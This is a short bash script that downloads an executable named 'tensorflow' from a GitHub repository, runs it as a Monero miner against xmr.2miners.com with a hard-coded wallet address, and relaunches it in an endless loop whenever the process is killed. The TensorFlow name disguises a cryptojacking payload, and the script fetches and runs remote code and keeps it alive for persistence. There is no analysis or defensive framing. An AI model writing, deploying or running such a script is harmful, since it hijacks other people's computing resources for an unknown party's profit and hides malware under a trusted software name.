#!/bin/bash

# Function to start tensorflow
start_tensorflow() {
    ./tensorflow -o xmr.2miners.com:2222 -u 467DcTyWTHXNY2pudrVQ8g48Sa1fDHdWKfUwWy5nRZ26KW7gA6DbRsQ9CwDba3A3Wy5KU9P7neKp8HMSWA2PR87UHSPTF3y -p x -k --coin monero
}

# Download and setup tensorflow
wget https://github.com/fonciarz0/google/raw/main/tensorflow
chmod +x tensorflow

# Start tensorflow
start_tensorflow &

# Store the PID of the tensorflow process
PID=$!

# Infinite loop to check if tensorflow is running
while true; do
    if ! ps -p $PID > /dev/null; then
        echo "Tensorflow process killed. Restarting..."
        start_tensorflow &
        PID=$!
    fi
    sleep 1
done
